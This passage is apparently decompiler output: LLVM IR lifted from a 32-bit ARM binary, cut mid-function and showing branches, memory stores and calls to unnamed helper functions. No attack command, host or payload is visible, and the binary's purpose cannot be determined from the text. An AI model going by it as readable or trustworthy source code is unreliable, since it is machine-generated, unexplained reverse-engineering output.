  %v3_8dd0 = load i32, i32* %v2_8dd0, align 4
  store i32 %v2_8764, i32* %r1.global-to-local, align 4
  %v2_8dd8 = add i32 %v3_8dd0, %v4_8dbc
  store i32 %v2_8dd8, i32* @r4, align 4
  store i32 %v2_8dd8, i32* %v2_8dd0, align 4
  %v0_8de0 = load i32, i32* %r1.global-to-local, align 4
  %v1_8de0 = load i32, i32* @sl, align 4
  %v2_8de0 = add i32 %v1_8de0, -1444
  %v3_8de0 = inttoptr i32 %v2_8de0 to i32*
  store i32 %v0_8de0, i32* %v3_8de0, align 4
  br label %dec_label_pc_8e70

dec_label_pc_8de8:                                ; preds = %dec_label_pc_8e70
  %v1_8de8 = inttoptr i32 %v0_8e70 to i32*
  %v2_8de8 = load i32, i32* %v1_8de8, align 4
  store i32 %v2_8de8, i32* @r8, align 4
  %v1_8dec = load i32, i32* @r4, align 4
  %v5_8df0 = icmp slt i32 %v3_8e70, %v1_8dec
  %storemerge46 = select i1 %v5_8df0, i32 %v3_8e70, i32 %v1_8dec
  store i32 %storemerge46, i32* @r6, align 4
  %v2_8df8 = sub i32 %v3_8e70, %storemerge46
  store i32 %v2_8df8, i32* %r3.global-to-local, align 4
  %v2_8dfc = icmp ne i32 %v2_8de8, 0
  store i1 %v2_8dfc, i1* %cpsr_c.global-to-local, align 1
  %v7_8dfc = icmp eq i32 %v2_8de8, 1
  store i1 %v7_8dfc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8df8, i32* %v2_8e70, align 4
  br i1 %v7_8dfc, label %dec_label_pc_8ec0, label %.dec_label_pc_8e0cthread-pre-split_crit_edge

.dec_label_pc_8e0cthread-pre-split_crit_edge:     ; preds = %dec_label_pc_8de8
  %v1_8e04 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_8e04, i32* @r5, align 4
  br label %dec_label_pc_8e0c

dec_label_pc_8e0c:                                ; preds = %dec_label_pc_8e7c, %.dec_label_pc_8e0cthread-pre-split_crit_edge, %dec_label_pc_8ee8
  %v0_8e0c = phi i32 [ %v3_8ee8, %dec_label_pc_8ee8 ], [ %v1_8e04, %.dec_label_pc_8e0cthread-pre-split_crit_edge ], [ %v3_8e70, %dec_label_pc_8e7c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e0c = icmp eq i32 %v0_8e0c, 0
  store i1 %v2_8e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e0c, label %dec_label_pc_8e14, label %dec_label_pc_8e34

dec_label_pc_8e14:                                ; preds = %dec_label_pc_8e0c
  %v0_8e14 = load i32, i32* @sl, align 4
  %v1_8e14 = add i32 %v0_8e14, 8
  %v2_8e14 = inttoptr i32 %v1_8e14 to i32*
  %v3_8e14 = load i32, i32* %v2_8e14, align 4
  store i32 %v3_8e14, i32* @r4, align 4
  %v2_8e18 = icmp ne i32 %v3_8e14, 0
  store i1 %v2_8e18, i1* %cpsr_c.global-to-local, align 1
  %v7_8e18 = icmp eq i32 %v3_8e14, 1
  store i1 %v7_8e18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e18, label %dec_label_pc_8ef0, label %dec_label_pc_8e20

dec_label_pc_8e20:                                ; preds = %dec_label_pc_8e14
  %v1_8e20 = add i32 %v0_8e14, 660
  %v2_8e20 = inttoptr i32 %v1_8e20 to i32*
  %v3_8e20 = load i32, i32* %v2_8e20, align 4
  %v0_8e24 = load i32, i32* @r6, align 4
  %v2_8e24 = sub i32 %v3_8e20, %v0_8e24
  store i32 %v2_8e24, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e28 = icmp eq i32 %v2_8e24, 0
  store i1 %v2_8e28, i1* %cpsr_z.global-to-local, align 1
  %v2_8e2c = add i32 %v0_8e14, 12
  %v3_8e2c = inttoptr i32 %v2_8e2c to i32*
  store i32 %v2_8e24, i32* %v3_8e2c, align 4
  br i1 %v2_8e28, label %dec_label_pc_9704, label %dec_label_pc_8e34

dec_label_pc_8e34:                                ; preds = %dec_label_pc_8e0c, %dec_label_pc_8ef0, %dec_label_pc_8e20, %dec_label_pc_8f78
  %v0_8e34 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e34 = icmp eq i32 %v0_8e34, 0
  store i1 %v2_8e34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e34, label %dec_label_pc_8e84, label %dec_label_pc_8e3c

dec_label_pc_8e3c:                                ; preds = %dec_label_pc_8e34
  %v0_8e3c = load i32, i32* @sl, align 4
  %v1_8e3c = add i32 %v0_8e3c, 660
  %v2_8e3c = inttoptr i32 %v1_8e3c to i32*
  %v3_8e3c = load i32, i32* %v2_8e3c, align 4
  store i32 %v3_8e3c, i32* %r3.global-to-local, align 4
  %v2_8e40 = sub i32 %v3_8e3c, %v0_8e34
  store i32 %v2_8e40, i32* @r4, align 4
  store i32 %v2_8e40, i32* %r2.global-to-local, align 4
  store i32 %v2_8e40, i32* %v2_8e3c, align 4
  %v0_8e4c = load i32, i32* @r7, align 4
  %v1_8e4c = load i32, i32* @r6, align 4
  %v2_8e4c = add i32 %v1_8e4c, %v0_8e4c
  store i32 %v2_8e4c, i32* %r1.global-to-local, align 4
  store i32 %v0_8e4c, i32* %r0.global-to-local, align 4
  %v3_8e54 = inttoptr i32 %v0_8e4c to i8*
  %v4_8e54 = call i32 @function_15448(i8* %v3_8e54, i32 %v2_8e4c, i32 %v2_8e40)
  store i32 %v4_8e54, i32* %r0.global-to-local, align 4
  %v0_8e58 = load i32, i32* @sl, align 4
  %v1_8e58 = add i32 %v0_8e58, 660
  %v2_8e58 = inttoptr i32 %v1_8e58 to i32*
  %v3_8e58 = load i32, i32* %v2_8e58, align 4
  store i32 %v3_8e58, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8e60 = load i32, i32* @sb, align 4
  %v2_8e60 = add i32 %v0_8e60, %v3_8e58
  store i32 %v2_8e60, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e64 = icmp eq i32 %v3_8e58, 0
  store i1 %v2_8e64, i1* %cpsr_z.global-to-local, align 1
  %v3_8e68 = add i32 %v2_8e60, 2116
  %v4_8e68 = inttoptr i32 %v3_8e68 to i8*
  store i8 0, i8* %v4_8e68, align 1
  %v0_8e6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8e6c, label %dec_label_pc_8e84, label %dec_label_pc_8e70

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e3c, %dec_label_pc_8dd0
  %v0_8e70 = load i32, i32* @sl, align 4
  %v1_8e70 = add i32 %v0_8e70, 12
  %v2_8e70 = inttoptr i32 %v1_8e70 to i32*
  %v3_8e70 = load i32, i32* %v2_8e70, align 4
  store i32 %v3_8e70, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e74 = icmp eq i32 %v3_8e70, 0
  store i1 %v2_8e74, i1* %cpsr_z.global-to-local, align 1
  %v5_8e78 = icmp sgt i32 %v3_8e70, 0
  br i1 %v5_8e78, label %dec_label_pc_8de8, label %dec_label_pc_8e7c

dec_label_pc_8e7c:                                ; preds = %dec_label_pc_8e70
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_8e0c

dec_label_pc_8e84:                                ; preds = %dec_label_pc_8e3c, %dec_label_pc_8e34
  %v0_8e84 = load i32, i32* @sl, align 4
  %v1_8e84 = add i32 %v0_8e84, -1448
  %v2_8e84 = inttoptr i32 %v1_8e84 to i8*
  %v3_8e84 = load i8, i8* %v2_8e84, align 1
  %v4_8e84 = zext i8 %v3_8e84 to i32
  store i32 %v4_8e84, i32* %r3.global-to-local, align 4
  %v2_8e88 = icmp ugt i8 %v3_8e84, 6
  store i1 %v2_8e88, i1* %cpsr_c.global-to-local, align 1
  %v7_8e88 = icmp eq i8 %v3_8e84, 7
  store i1 %v7_8e88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e88, label %dec_label_pc_8e90, label %dec_label_pc_87b4

dec_label_pc_8e90:                                ; preds = %dec_label_pc_8e84
  %v1_8e90 = add i32 %v0_8e84, 660
  %v2_8e90 = inttoptr i32 %v1_8e90 to i32*
  %v3_8e90 = load i32, i32* %v2_8e90, align 4
  store i32 %v3_8e90, i32* %r3.global-to-local, align 4
  %v2_8e94 = icmp ugt i32 %v3_8e90, 1023
  store i1 %v2_8e94, i1* %cpsr_c.global-to-local, align 1
  %v7_8e94 = icmp eq i32 %v3_8e90, 1024
  store i1 %v7_8e94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e94, label %dec_label_pc_8e9c.loopexit, label %dec_label_pc_8d9c

dec_label_pc_8e9c.loopexit:                       ; preds = %dec_label_pc_8e90
  %v0_8e9c.pre = load i32, i32* @sb, align 4
  %v0_8ea4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e9c

dec_label_pc_8e9c:                                ; preds = %dec_label_pc_8e9c.loopexit, %dec_label_pc_8d88
  %v0_8ea4 = phi i32 [ %v0_8ea4.pre, %dec_label_pc_8e9c.loopexit ], [ %v1_8d94, %dec_label_pc_8d88 ]
  %v0_8e9c = phi i32 [ %v0_8e9c.pre, %dec_label_pc_8e9c.loopexit ], [ %v0_8d8c, %dec_label_pc_8d88 ]
  %v1_8ea0 = add i32 %v0_8e9c, 2180
  store i32 %v1_8ea0, i32* %r1.global-to-local, align 4
  store i32 %v0_8ea4, i32* %r0.global-to-local, align 4
  store i32 960, i32* %r2.global-to-local, align 4
  %v3_8eac = inttoptr i32 %v0_8ea4 to i8*
  %v4_8eac = call i32 @function_15448(i8* %v3_8eac, i32 %v1_8ea0, i32 960)
  store i32 %v4_8eac, i32* %r0.global-to-local, align 4
  %v0_8eb0 = load i32, i32* @sl, align 4
  %v1_8eb0 = add i32 %v0_8eb0, 660
  %v2_8eb0 = inttoptr i32 %v1_8eb0 to i32*
  %v3_8eb0 = load i32, i32* %v2_8eb0, align 4
  store i32 %v3_8eb0, i32* %r3.global-to-local, align 4
  %v1_8eb4 = add i32 %v3_8eb0, -64
  store i32 %v1_8eb4, i32* @r4, align 4
  store i32 %v1_8eb4, i32* %v2_8eb0, align 4
  br label %dec_label_pc_8d9c

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8de8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_8ec8 = call i32 @function_11a14(i32 36, i32* null)
  %v0_8ecc = load i32, i32* @r4, align 4
  store i32 %v0_8ecc, i32* %r1.global-to-local, align 4
  store i32 %v3_8ec8, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_8ed8 = load i32, i32* @r7, align 4
  store i32 %v0_8ed8, i32* %r0.global-to-local, align 4
  %v4_8edc = call i32 @function_12428(i32 %v0_8ed8, i32 %v0_8ecc, i32 %v3_8ec8, i32 11)
  store i32 %v4_8edc, i32* %r0.global-to-local, align 4
  %v3_8ee0 = icmp eq i32 %v4_8edc, -1
  store i1 %v3_8ee0, i1* %cpsr_c.global-to-local, align 1
  %v8_8ee0 = icmp eq i32 %v4_8edc, -1
  store i1 %v8_8ee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8ee0, label %dec_label_pc_8ee8, label %dec_label_pc_99a0

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ec0
  %v0_8ee8 = load i32, i32* @sl, align 4
  %v1_8ee8 = add i32 %v0_8ee8, 12
  %v2_8ee8 = inttoptr i32 %v1_8ee8 to i32*
  %v3_8ee8 = load i32, i32* %v2_8ee8, align 4
  store i32 %v3_8ee8, i32* @r5, align 4
  br label %dec_label_pc_8e0c

dec_label_pc_8ef0:                                ; preds = %dec_label_pc_8e14
  %v0_8ef0 = load i32, i32* @r7, align 4
  store i32 %v0_8ef0, i32* %r0.global-to-local, align 4
  %v1_8ef4 = add i32 %v0_8e14, 660
  %v2_8ef4 = inttoptr i32 %v1_8ef4 to i32*
  %v3_8ef4 = load i32, i32* %v2_8ef4, align 4
  store i32 %v3_8ef4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8f00 = call i32 @function_12428(i32 %v0_8ef0, i32 %v3_8ef4, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2)
  store i32 %v5_8f00, i32* %r0.global-to-local, align 4
  %v2_8f04 = icmp eq i32 %v5_8f00, -1
  store i1 %v2_8f04, i1* %cpsr_c.global-to-local, align 1
  %v7_8f04 = icmp eq i32 %v5_8f00, -1
  store i1 %v7_8f04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8f04, label %dec_label_pc_8e34, label %dec_label_pc_8f0c

dec_label_pc_8f0c:                                ; preds = %dec_label_pc_8ef0
  %v0_8f0c = load i32, i32* @sl, align 4
  %v1_8f0c = add i32 %v0_8f0c, 660
  %v2_8f0c = inttoptr i32 %v1_8f0c to i32*
  %v3_8f0c = load i32, i32* %v2_8f0c, align 4
  store i32 %v3_8f0c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_8f18 = load i32, i32* @r7, align 4
  store i32 %v0_8f18, i32* %r0.global-to-local, align 4
  %v5_8f1c = call i32 @function_12428(i32 %v0_8f18, i32 %v3_8f0c, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2)
  %v1_8f20 = load i32, i32* @sb, align 4
  %v2_8f20 = add i32 %v1_8f20, %v5_8f1c
  store i32 %v2_8f20, i32* %ip.global-to-local, align 4
  store i32 %v5_8f1c, i32* @r6, align 4
  store i32 %v5_8f1c, i32* %r1.global-to-local, align 4
  %v0_8f2c = load i32, i32* @r7, align 4
  store i32 %v0_8f2c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197ec.38 to i32), i32* %r2.global-to-local, align 4
  %v0_8f34 = load i32, i32* @r4, align 4
  store i32 %v0_8f34, i32* %r3.global-to-local, align 4
  %v0_8f38 = load i32, i32* @r5, align 4
  %v1_8f38 = trunc i32 %v0_8f38 to i8
  %v3_8f38 = add i32 %v2_8f20, 2114
  %v4_8f38 = inttoptr i32 %v3_8f38 to i8*
  store i8 %v1_8f38, i8* %v4_8f38, align 1
  %v4_8f3c = call i32 @function_12428(i32 %v0_8f2c, i32 %v5_8f1c, i32 ptrtoint (i32* @global_var_197ec.38 to i32), i32 %v0_8f34)
  store i32 %v4_8f3c, i32* %r0.global-to-local, align 4
  %v2_8f40 = icmp eq i32 %v4_8f3c, -1
  store i1 %v2_8f40, i1* %cpsr_c.global-to-local, align 1
  %v7_8f40 = icmp eq i32 %v4_8f3c, -1
  store i1 %v7_8f40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8f40, label %dec_label_pc_8f64, label %dec_label_pc_8f48

dec_label_pc_8f48:                                ; preds = %dec_label_pc_8f0c
  %v0_8f48 = load i32, i32* @r7, align 4
  store i32 %v0_8f48, i32* %r0.global-to-local, align 4
  %v0_8f4c = load i32, i32* @r6, align 4
  store i32 %v0_8f4c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197ec.38 to i32), i32* %r2.global-to-local, align 4
  %v0_8f54 = load i32, i32* @r4, align 4
  store i32 %v0_8f54, i32* %r3.global-to-local, align 4
  %v4_8f58 = call i32 @function_12428(i32 %v0_8f48, i32 %v0_8f4c, i32 ptrtoint (i32* @global_var_197ec.38 to i32), i32 %v0_8f54)
  %v0_8f5c = load i32, i32* @sb, align 4
  %v2_8f5c = add i32 %v0_8f5c, %v4_8f58
  store i32 %v2_8f5c, i32* %r0.global-to-local, align 4
  %v0_8f60 = load i32, i32* @r5, align 4
  %v1_8f60 = trunc i32 %v0_8f60 to i8
  %v3_8f60 = add i32 %v2_8f5c, 2116
  %v4_8f60 = inttoptr i32 %v3_8f60 to i8*
  store i8 %v1_8f60, i8* %v4_8f60, align 1
  br label %dec_label_pc_8f64

dec_label_pc_8f64:                                ; preds = %dec_label_pc_8f0c, %dec_label_pc_8f48
  %v0_8f64 = load i32, i32* @r7, align 4
  store i32 %v0_8f64, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_8f6c = inttoptr i32 %v0_8f64 to i8*
  %v3_8f6c = call i32 @function_12494(i8* %v2_8f6c, i32 16)
  store i32 %v3_8f6c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8f70 = icmp eq i32 %v3_8f6c, 0
  store i1 %v2_8f70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f70, label %dec_label_pc_9b54, label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8f64
  %v1_8f78 = add i32 %v3_8f6c, 2
  store i32 %v1_8f78, i32* %r3.global-to-local, align 4
  %v1_8f7c = load i32, i32* @sl, align 4
  %v2_8f7c = add i32 %v1_8f7c, 12
  %v3_8f7c = inttoptr i32 %v2_8f7c to i32*
  store i32 %v1_8f78, i32* %v3_8f7c, align 4
  br label %dec_label_pc_8e34

dec_label_pc_8f84:                                ; preds = %dec_label_pc_858c
  %v2_8f84 = inttoptr i32 %v1_85e0 to i32*
  %v3_8f84 = load i32, i32* %v2_8f84, align 4
  store i32 %v3_8f84, i32* %ip.global-to-local, align 4
  %v3_8f8c = udiv i32 %v3_8f84, 32
  %v3_8f90 = mul nuw nsw i32 %v3_8f8c, 4
  store i32 %v2_86d8, i32* @lr, align 4
  %v2_8f98 = add i32 %v3_8f90, %v2_86d8
  store i32 %v2_8f98, i32* %r2.global-to-local, align 4
  %v1_8f9c = add i32 %v2_8f98, -164
  %v2_8f9c = inttoptr i32 %v1_8f9c to i32*
  %v3_8f9c = load i32, i32* %v2_8f9c, align 4
  %v1_8fa0 = urem i32 %v3_8f84, 32
  store i32 %v1_8fa0, i32* %r0.global-to-local, align 4
  store i32 %v1_8584, i32* %r3.global-to-local, align 4
  %v7_8fa8 = shl i32 %v1_8584, %v1_8fa0
  %v8_8fa8 = or i32 %v3_8f9c, %v7_8fa8
  store i32 %v8_8fa8, i32* %r1.global-to-local, align 4
  %v1_8fac = load i32, i32* @r8, align 4
  %v2_8fac = sub i32 %v3_8f84, %v1_8fac
  %v3_8fac = icmp uge i32 %v3_8f84, %v1_8fac
  store i1 %v3_8fac, i1* %cpsr_c.global-to-local, align 1
  %v4_8fac = xor i32 %v1_8fac, %v3_8f84
  %v5_8fac = xor i32 %v2_8fac, %v3_8f84
  %v6_8fac = and i32 %v5_8fac, %v4_8fac
  %v7_8fac = icmp slt i32 %v6_8fac, 0
  %v8_8fac = icmp slt i32 %v2_8fac, 0
  %v9_8fac = icmp eq i32 %v3_8f84, %v1_8fac
  store i1 %v9_8fac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8fa8, i32* %v2_8f9c, align 4
  %v3_8fb4 = xor i1 %v8_8fac, %v7_8fac
  %v4_8fb4 = or i1 %v9_8fac, %v3_8fb4
  br i1 %v4_8fb4, label %dec_label_pc_85bc, label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f84
  %v0_8fb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_8fb8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fb8 = add i32 %v1_8fb8, %v0_8fb8
  store i32 %v2_8fb8, i32* @r8, align 4
  br label %dec_label_pc_8700

dec_label_pc_8fc0:                                ; preds = %dec_label_pc_8810
  store i32 %v3_8854, i32* @r0, align 4
  %v1_8fc4 = call i32 @function_15b6c(i32 %v3_8854)
  store i32 %v1_8fc4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_8fcc = load i32, i32* @sl, align 4
  %v2_8fcc = add i32 %v1_8fcc, -1452
  %v3_8fcc = inttoptr i32 %v2_8fcc to i32*
  store i32 -1, i32* %v3_8fcc, align 4
  %v0_8fd0 = load i32, i32* @r5, align 4
  %v1_8fd0 = trunc i32 %v0_8fd0 to i8
  %v2_8fd0 = load i32, i32* @sl, align 4
  %v3_8fd0 = add i32 %v2_8fd0, -1448
  %v4_8fd0 = inttoptr i32 %v3_8fd0 to i8*
  store i8 %v1_8fd0, i8* %v4_8fd0, align 1
  br label %dec_label_pc_87b4

dec_label_pc_8fd8:                                ; preds = %dec_label_pc_8594
  %v2_8fd8 = inttoptr i32 %v1_85e0 to i32*
  %v3_8fd8 = load i32, i32* %v2_8fd8, align 4
  store i32 %v3_8fd8, i32* %ip.global-to-local, align 4
  %v3_8fe0 = udiv i32 %v3_8fd8, 32
  store i32 %v2_86d8, i32* %r1.global-to-local, align 4
  %v3_8fe8 = mul nuw nsw i32 %v3_8fe0, 4
  %v2_8fec = add i32 %v3_8fe8, %v2_86d8
  store i32 %v2_8fec, i32* %r2.global-to-local, align 4
  %v1_8ff0 = add i32 %v2_8fec, -164
  %v2_8ff0 = inttoptr i32 %v1_8ff0 to i32*
  %v3_8ff0 = load i32, i32* %v2_8ff0, align 4
  %v1_8ff4 = urem i32 %v3_8fd8, 32
  store i32 %v1_8ff4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8ffc = shl i32 1, %v1_8ff4
  %v8_8ffc = or i32 %v3_8ff0, %v7_8ffc
  store i32 %v8_8ffc, i32* %r1.global-to-local, align 4
  %v1_9000 = load i32, i32* @r8, align 4
  %v2_9000 = sub i32 %v3_8fd8, %v1_9000
  %v3_9000 = icmp uge i32 %v3_8fd8, %v1_9000
  store i1 %v3_9000, i1* %cpsr_c.global-to-local, align 1
  %v4_9000 = xor i32 %v1_9000, %v3_8fd8
  %v5_9000 = xor i32 %v2_9000, %v3_8fd8
  %v6_9000 = and i32 %v5_9000, %v4_9000
  %v7_9000 = icmp slt i32 %v6_9000, 0
  %v8_9000 = icmp slt i32 %v2_9000, 0
  %v9_9000 = icmp eq i32 %v3_8fd8, %v1_9000
  store i1 %v9_9000, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8ffc, i32* %v2_8ff0, align 4
  %v3_9008 = xor i1 %v8_9000, %v7_9000
  %v4_9008 = or i1 %v9_9000, %v3_9008
  br i1 %v4_9008, label %dec_label_pc_85bc, label %dec_label_pc_900c

dec_label_pc_900c:                                ; preds = %dec_label_pc_8fd8
  %v0_900c = load i32, i32* %ip.global-to-local, align 4
  %v1_900c = load i32, i32* %r3.global-to-local, align 4
  %v2_900c = add i32 %v1_900c, %v0_900c
  store i32 %v2_900c, i32* @r8, align 4
  br label %dec_label_pc_8700

dec_label_pc_9054:                                ; preds = %dec_label_pc_8798
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_905c = call i32 @function_12404(i32 %v2_8278, i32 10240)
  store i32 %v2_905c, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_9068 = load i32, i32* @sl, align 4
  %v1_9068 = add i32 %v0_9068, -1452
  %v2_9068 = inttoptr i32 %v1_9068 to i32*
  %v3_9068 = load i32, i32* %v2_9068, align 4
  store i32 %v3_9068, i32* @r0, align 4
  store i32 %v2_8278, i32* @r1, align 4
  store i32 10240, i32* @r2, align 4
  %v4_9074 = call i32 @function_14a54(i32 %v3_9068, i32 %v2_8278, i32 10240, i32 16386)
  store i32 %v4_9074, i32* %r0.global-to-local, align 4
  store i32 %v4_9074, i32* @fp, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_907c = icmp eq i32 %v4_9074, 0
  store i1 %v2_907c, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r7, align 4
  %tmp169 = icmp slt i32 %v4_9074, 1
  br i1 %tmp169, label %dec_label_pc_95bc, label %dec_label_pc_9088

dec_label_pc_9088:                                ; preds = %dec_label_pc_9054
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  store i32 %v4_9074, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_197e4.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_9098 = call i32 @function_12428(i32 %v2_8278, i32 %v4_9074, i32 ptrtoint ([5 x i8]* @global_var_197e4.40 to i32), i32 4)
  store i32 %v5_9098, i32* %r0.global-to-local, align 4
  %v3_909c = icmp eq i32 %v5_9098, -1
  store i1 %v3_909c, i1* %cpsr_c.global-to-local, align 1
  %v8_909c = icmp eq i32 %v5_9098, -1
  store i1 %v8_909c, i1* %cpsr_z.global-to-local, align 1
  %v0_90a4 = load i32, i32* @fp, align 4
  br i1 %v3_909c, label %dec_label_pc_90a4, label %dec_label_pc_90ac

dec_label_pc_90a4:                                ; preds = %dec_label_pc_9088
  %v3_90a4 = icmp ugt i32 %v0_90a4, 10239
  store i1 %v3_90a4, i1* %cpsr_c.global-to-local, align 1
  %v8_90a4 = icmp eq i32 %v0_90a4, 10240
  store i1 %v8_90a4, i1* %cpsr_z.global-to-local, align 1
  %v5_90a8 = icmp slt i32 %v0_90a4, 10240
  br i1 %v5_90a8, label %dec_label_pc_87b4, label %dec_label_pc_90ac

dec_label_pc_90ac:                                ; preds = %dec_label_pc_9088, %dec_label_pc_90a4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_197e4.40 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_90a4, i32* %r1.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v5_90bc = call i32 @function_12428(i32 %v2_8278, i32 %v0_90a4, i32 ptrtoint ([5 x i8]* @global_var_197e4.40 to i32), i32 4)
  store i32 %v2_8278, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v4_90c8 = add i32 %v5_90bc, %v2_8278
  %v5_90c8 = inttoptr i32 %v4_90c8 to i8*
  store i8 0, i8* %v5_90c8, align 1
  %v0_90cc = load i32, i32* @r5, align 4
  store i32 %v0_90cc, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_90d4 = inttoptr i32 %v0_90cc to i32*
  %v3_90d4 = call i32 @function_11a14(i32 46, i32* %v2_90d4)
  %v0_90d8 = load i32, i32* @fp, align 4
  store i32 %v0_90d8, i32* @r1, align 4
  store i32 %v3_90d4, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_90e4 = call i32 @function_126cc(i8* %v3_829c, i32 %v0_90d8, i32 %v3_90d4)
  store i32 %v4_90e4, i32* %r0.global-to-local, align 4
  %v2_90e8 = icmp eq i32 %v4_90e4, -1
  store i1 %v2_90e8, i1* %cpsr_c.global-to-local, align 1
  %v7_90e8 = icmp eq i32 %v4_90e4, -1
  store i1 %v7_90e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90e8, label %.thread22, label %bb170

bb170:                                            ; preds = %dec_label_pc_90ac
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_90f0 = load i32, i32* @sl, align 4
  %v3_90f0 = inttoptr i32 %v2_90f0 to i32*
  store i32 2, i32* %v3_90f0, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_90ac, %bb170
  %v0_90f4 = load i32, i32* @r5, align 4
  store i32 %v0_90f4, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_90fc = inttoptr i32 %v0_90f4 to i32*
  %v3_90fc = call i32 @function_11a14(i32 45, i32* %v2_90fc)
  %v0_9100 = load i32, i32* @fp, align 4
  store i32 %v0_9100, i32* @r1, align 4
  store i32 %v3_90fc, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_910c = call i32 @function_126cc(i8* %v3_829c, i32 %v0_9100, i32 %v3_90fc)
  store i32 %v4_910c, i32* %r0.global-to-local, align 4
  %v2_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v2_9110, i1* %cpsr_c.global-to-local, align 1
  %v7_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v7_9110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9110, label %.thread23, label %bb171

bb171:                                            ; preds = %.thread22
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9118 = load i32, i32* @sl, align 4
  %v3_9118 = inttoptr i32 %v2_9118 to i32*
  store i32 1, i32* %v3_9118, align 4
  br label %.thread23

.thread23:                                        ; preds = %.thread22, %bb171
  %v0_911c = load i32, i32* @r5, align 4
  store i32 %v0_911c, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_9124 = load i32, i32* @sl, align 4
  %v2_9124 = add i32 %v1_9124, 4
  %v3_9124 = inttoptr i32 %v2_9124 to i32*
  store i32 %v0_911c, i32* %v3_9124, align 4
  %v2_9128 = inttoptr i32 %v0_911c to i32*
  %v3_9128 = call i32 @function_11a14(i32 44, i32* %v2_9128)
  %v0_912c = load i32, i32* @fp, align 4
  store i32 %v0_912c, i32* @r1, align 4
  store i32 %v3_9128, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9138 = call i32 @function_126cc(i8* %v3_829c, i32 %v0_912c, i32 %v3_9128)
  store i32 %v4_9138, i32* %r0.global-to-local, align 4
  %v2_913c = icmp eq i32 %v4_9138, -1
  store i1 %v2_913c, i1* %cpsr_c.global-to-local, align 1
  %v7_913c = icmp eq i32 %v4_9138, -1
